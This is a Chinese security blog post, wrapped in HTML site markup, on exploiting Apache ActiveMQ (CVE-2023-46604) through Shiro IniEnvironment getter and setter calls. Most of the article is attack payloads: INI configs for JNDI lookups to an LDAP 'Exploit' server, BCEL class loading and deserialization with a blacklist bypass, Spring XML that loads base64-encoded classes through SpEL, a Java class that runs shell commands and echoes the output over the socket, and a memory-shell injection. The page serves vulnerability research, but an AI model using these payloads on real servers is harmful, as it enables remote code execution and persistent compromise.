@@ -1,0 +1,820 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zer0peach">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ActiveMQ依赖存在的getterIniEnvironment分析 iniConfig参数是shiro.ini配置文件的内容 https:&#x2F;&#x2F;shiro.apache.org&#x2F;configuration.html  [main] user&#x3D;com.just.User       &#x2F;&#x2F;别名&#x3D;全类名 info&#x3D;com.just.Info user.info&#x3D;$info             &#x2F;&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ActiveMQ依赖存在的getter">
+<meta property="og:url" content="https://zer0peach.github.io/2024/09/27/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/index.html">
+<meta property="og:site_name" content="Zer0peach can&#39;t think">
+<meta property="og:description" content="ActiveMQ依赖存在的getterIniEnvironment分析 iniConfig参数是shiro.ini配置文件的内容 https:&#x2F;&#x2F;shiro.apache.org&#x2F;configuration.html  [main] user&#x3D;com.just.User       &#x2F;&#x2F;别名&#x3D;全类名 info&#x3D;com.just.Info user.info&#x3D;$info             &#x2F;&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zer0peach.github.io/images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927042652383.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927042926374.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927051901541.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927052815945.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927051923752.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927172005930.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927172129435.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927174306349.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927174321474.png">
+<meta property="article:published_time" content="2024-09-26T18:49:39.000Z">
+<meta property="article:modified_time" content="2024-09-27T09:47:15.945Z">
+<meta property="article:author" content="Zer0peach">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://zer0peach.github.io/images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927042652383.png">
+  
+  
+  
+  <title>ActiveMQ依赖存在的getter - Zer0peach can&#39;t think</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zer0peach&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ActiveMQ依赖存在的getter"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-27 02:49" pubdate>
+          2024年9月27日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          56 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ActiveMQ依赖存在的getter</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="ActiveMQ依赖存在的getter"><a href="#ActiveMQ依赖存在的getter" class="headerlink" title="ActiveMQ依赖存在的getter"></a>ActiveMQ依赖存在的getter</h1><h2 id="IniEnvironment分析"><a href="#IniEnvironment分析" class="headerlink" title="IniEnvironment分析"></a>IniEnvironment分析</h2><p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927042652383.png" srcset="/img/loading.gif" lazyload alt="image-20240927042652383"></p>
+<p><code>iniConfig</code>参数是<code>shiro.ini</code>配置文件的内容</p>
+<p><a target="_blank" rel="noopener" href="https://shiro.apache.org/configuration.html">https://shiro.apache.org/configuration.html</a></p>
+<p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927042926374.png" srcset="/img/loading.gif" lazyload alt="image-20240927042926374"></p>
+<div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[main]</span>
+<span class="hljs-attr">user</span>=com.just.User       //别名=全类名
+<span class="hljs-attr">info</span>=com.just.Info
+<span class="hljs-attr">user.info</span>=<span class="hljs-variable">$info</span>             //引用也会调用setter
+<span class="hljs-attr">user.info.username</span>=anchor   //会调用setter
+<span class="hljs-attr">user.info.password</span>=<span class="hljs-number">123456</span>   //会调用setter</code></pre></div>
+
+<p>类似于这种会调用getter</p>
+<div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">user.object.a</span>=<span class="hljs-number">1</span></code></pre></div>
+
+<p>这样调用的是getObject</p>
+<p>具体为什么会调用setter&#x2F;getter就自己调试吧</p>
+<h3 id="会调用getter-setter就好办了"><a href="#会调用getter-setter就好办了" class="headerlink" title="会调用getter&#x2F;setter就好办了"></a>会调用getter&#x2F;setter就好办了</h3><h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[main]</span>
+<span class="hljs-attr">jdbc</span> = com.sun.rowset.jdbcRowsetImpl
+<span class="hljs-attr">jdbc.dataSourceName</span> =<span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>
+<span class="hljs-attr">jdbc.autoCommit</span> = <span class="hljs-literal">true</span>      //调用setter</code></pre></div>
+
+
+
+<h4 id="dbcp打BCEL"><a href="#dbcp打BCEL" class="headerlink" title="dbcp打BCEL"></a>dbcp打BCEL</h4><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[main]</span>
+bds = org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.dbcp2</span><span class="hljs-selector-class">.BasicDataSource</span>
+bds<span class="hljs-selector-class">.driverClassLoader</span> = com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.bcel</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.ClassLoader</span>
+bds<span class="hljs-selector-class">.driverClassName</span> = <span class="hljs-string">&quot;$$BCEL$$.....&quot;</span>
+bds<span class="hljs-selector-class">.connection</span><span class="hljs-selector-class">.a</span> = <span class="hljs-selector-tag">a</span>         <span class="hljs-comment">//调用getConnection</span></code></pre></div>
+
+<p>类似getter&#x2F;setter都可以</p>
+<h2 id="ActiveMQObjectMessage-getObject-存在反序列化漏洞"><a href="#ActiveMQObjectMessage-getObject-存在反序列化漏洞" class="headerlink" title="ActiveMQObjectMessage#getObject()存在反序列化漏洞"></a>ActiveMQObjectMessage#getObject()存在反序列化漏洞</h2><p>利用上面IniEnvironment调用getter</p>
+<p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927051901541.png" srcset="/img/loading.gif" lazyload alt="image-20240927051901541"></p>
+<p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927052815945.png" srcset="/img/loading.gif" lazyload alt="image-20240927052815945"></p>
+<p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927051923752.png" srcset="/img/loading.gif" lazyload alt="image-20240927051923752"></p>
+<p>字节类型的属性可以通过 <code>base64</code> 来赋值或者十六编码来赋值</p>
+<p>然后需要注意的就是修改 <code>trustAllPackages</code> ，不然会由于 <code>activemq</code> 默认存在反序列化黑名单，导致反序列化失败</p>
+<p>由于自带shiro依赖，所以可以打cb链</p>
+<div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[main]</span>
+<span class="hljs-attr">bs</span> = org.apache.activemq.util.ByteSequence
+<span class="hljs-attr">message</span> = org.apache.activemq.command.ActiveMQObjectMessage
+<span class="hljs-attr">bs.data</span> = rO0ABXNyABdqYXZh.....
+<span class="hljs-attr">bs.length</span> = <span class="hljs-number">1376</span>               //一定要有length
+<span class="hljs-attr">bs.offset</span> = <span class="hljs-number">0</span>
+<span class="hljs-attr">message.content</span> = <span class="hljs-variable">$bs</span>
+<span class="hljs-attr">message.trustAllPackages</span> = <span class="hljs-literal">true</span>
+<span class="hljs-attr">message.object.x</span> = x          //调用getter</code></pre></div>
+
+<h2 id="有回显exp"><a href="#有回显exp" class="headerlink" title="有回显exp"></a>有回显exp</h2><p><a target="_blank" rel="noopener" href="https://github.com/Hutt0n0/ActiveMqRCE/tree/master">Hutt0n0&#x2F;ActiveMqRCE: 用java实现构造openwire协议，利用activeMQ &lt; 5.18.3 RCE 回显利用 内存马注入 (github.com)</a></p>
+<div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span></span>
+<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span>
+<span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:spring</span>=<span class="hljs-string">&quot;http://camel.apache.org/schema/spring&quot;</span></span></span>
+<span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span>
+<span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">context:property-placeholder</span> <span class="hljs-attr">ignore-resource-not-found</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">ignore-unresolvable</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span></span>
+<span class="language-xml"></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;base64Str&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span></span>
+<span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span></span>
+<span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>yv66vgAAADQAtgoAKgBhCABi...........<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span>
+<span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span>
+<span class="language-xml"></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;cmd&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span></span>
+<span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;ls&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span>  <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;#</span></span></span><span class="hljs-template-variable">&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;CMDResponse&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(base64Str.toString()),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance().test(cmd.toString())&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span>
+<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></span></code></pre></div>
+
+
+
+<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;
+<span class="hljs-keyword">import</span> java.io.IOException;
+<span class="hljs-keyword">import</span> java.io.InputStream;
+<span class="hljs-keyword">import</span> java.io.OutputStream;
+<span class="hljs-keyword">import</span> java.lang.reflect.Field;
+
+<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CMDResponse</span> &#123;
+
+
+    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> IOException &#123;
+        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;
+        <span class="hljs-type">String</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;
+        <span class="hljs-type">String</span> <span class="hljs-variable">arg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;
+        <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().indexOf(<span class="hljs-string">&quot;windows&quot;</span>) &gt;= <span class="hljs-number">0</span>) &#123;
+            process = <span class="hljs-string">&quot;cmd.exe&quot;</span>;
+            arg = <span class="hljs-string">&quot;/c&quot;</span>;
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            process = <span class="hljs-string">&quot;/bin/sh&quot;</span>;
+            arg = <span class="hljs-string">&quot;-c&quot;</span>;
+        &#125;
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-type">ProcessBuilder</span> <span class="hljs-variable">processBuilder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;process,arg,cmd&#125;);
+            <span class="hljs-type">Process</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> processBuilder.start();
+            <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> start.getInputStream();
+            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
+            <span class="hljs-type">int</span> <span class="hljs-variable">read</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
+            <span class="hljs-keyword">while</span> ((read = inputStream.read()) != -<span class="hljs-number">1</span>)&#123;
+                byteArrayOutputStream.write(read);
+            &#125;
+            result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(byteArrayOutputStream.toByteArray());
+        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;
+            result = e.getMessage();
+        &#125;
+
+
+		<span class="hljs-comment">//利用socket回显</span>
+        <span class="hljs-keyword">try</span> &#123;
+            <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> Thread.currentThread();
+            Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;java.lang.Thread&quot;</span>);
+            <span class="hljs-type">Field</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;target&quot;</span>);
+            target.setAccessible(<span class="hljs-literal">true</span>);
+            org.apache.activemq.transport.tcp.<span class="hljs-type">TcpTransport</span> <span class="hljs-variable">transport</span> <span class="hljs-operator">=</span> (org.apache.activemq.transport.tcp.TcpTransport)target.get(thread);
+            Class&lt;?&gt; aClass1 = Class.forName(<span class="hljs-string">&quot;org.apache.activemq.transport.tcp.TcpTransport&quot;</span>);
+            <span class="hljs-type">Field</span> <span class="hljs-variable">socketfield</span> <span class="hljs-operator">=</span> aClass1.getDeclaredField(<span class="hljs-string">&quot;socket&quot;</span>);
+            socketfield.setAccessible(<span class="hljs-literal">true</span>);
+            java.net.<span class="hljs-type">Socket</span> <span class="hljs-variable">socket</span> <span class="hljs-operator">=</span>(java.net.Socket) socketfield.get(transport);
+            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> socket.getOutputStream();
+            outputStream.write(<span class="hljs-string">&quot;\n&quot;</span>.getBytes());
+            outputStream.write(result.getBytes());
+            outputStream.close();
+        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;
+
+        &#125;
+    &#125;
+&#125;</code></pre></div>
+
+
+
+
+
+<h2 id="能访问-admin才可以的内存马注入"><a href="#能访问-admin才可以的内存马注入" class="headerlink" title="能访问&#x2F;admin才可以的内存马注入"></a>能访问&#x2F;admin才可以的内存马注入</h2><p>出网加载xml，内容为内存马而不是反弹shell</p>
+<p>activemq中间件是jetty，然后遍历线程</p>
+<div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span></span>
+<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span>
+<span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xmlns:spring</span>=<span class="hljs-string">&quot;http://camel.apache.org/schema/spring&quot;</span></span></span>
+<span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xmlns:context</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span>
+<span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd&quot;</span>&gt;</span></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">context:property-placeholder</span> <span class="hljs-attr">ignore-resource-not-found</span>=<span class="hljs-string">&quot;false&quot;</span> <span class="hljs-attr">ignore-unresolvable</span>=<span class="hljs-string">&quot;false&quot;</span>/&gt;</span></span>
+<span class="language-xml"></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ClassBase64Str&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.String&quot;</span>&gt;</span></span>
+<span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;yv66vgAAADQBuQoAVADvBwDwCwDxAPIIAPMKAPQ..........&quot;</span>&gt;</span></span>
+<span class="language-xml"></span>
+<span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span>
+<span class="language-xml"></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span>  <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;#</span></span></span><span class="hljs-template-variable">&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(&#x27;MemshellInject1&#x27;,T(org.springframework.util.Base64Utils).decodeFromString(ClassBase64Str.toString()),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance().test1()&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span>
+<span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span>
+<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></span></code></pre></div>
+
+<p>MemshellInject1看上面的github</p>
+<h2 id="利用IniEnvironment打回显马"><a href="#利用IniEnvironment打回显马" class="headerlink" title="利用IniEnvironment打回显马"></a>利用IniEnvironment打回显马</h2><p><a target="_blank" rel="noopener" href="https://github.com/Arlenhiack/ActiveMQ-RCE-Exploit/tree/main">Arlenhiack&#x2F;ActiveMQ-RCE-Exploit: ActiveMQ RCE (CVE-2023-46604) 回显利用工具 (github.com)</a></p>
+<p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927172005930.png" srcset="/img/loading.gif" lazyload alt="image-20240927172005930"></p>
+<p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927172129435.png" srcset="/img/loading.gif" lazyload alt="image-20240927172129435"></p>
+<p>就是把ClassPathXmlApplicationContext替换为IniEnvironment</p>
+<p>然后内容为</p>
+<div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-section">[main]</span>
+<span class="hljs-attr">bs</span> = org.apache.activemq.util.ByteSequence
+<span class="hljs-attr">message</span> = org.apache.activemq.command.ActiveMQObjectMessage
+<span class="hljs-attr">bs.data</span> = rO0ABXNyABdqYXZh.....
+<span class="hljs-attr">bs.length</span> = <span class="hljs-number">1376</span>
+<span class="hljs-attr">bs.offset</span> = <span class="hljs-number">0</span>
+<span class="hljs-attr">message.content</span> = <span class="hljs-variable">$bs</span>
+<span class="hljs-attr">message.trustAllPackages</span> = <span class="hljs-literal">true</span>
+<span class="hljs-attr">message.object.x</span> = x</code></pre></div>
+
+<p>cb链打的回显马需要使用到socket</p>
+<p><img src="/../images/ActiveMQ%E4%BE%9D%E8%B5%96%E5%AD%98%E5%9C%A8%E7%9A%84getter/image-20240927174306349.png" srcset="/img/loading.gif" lazyload alt="image-20240927174306349"></p>
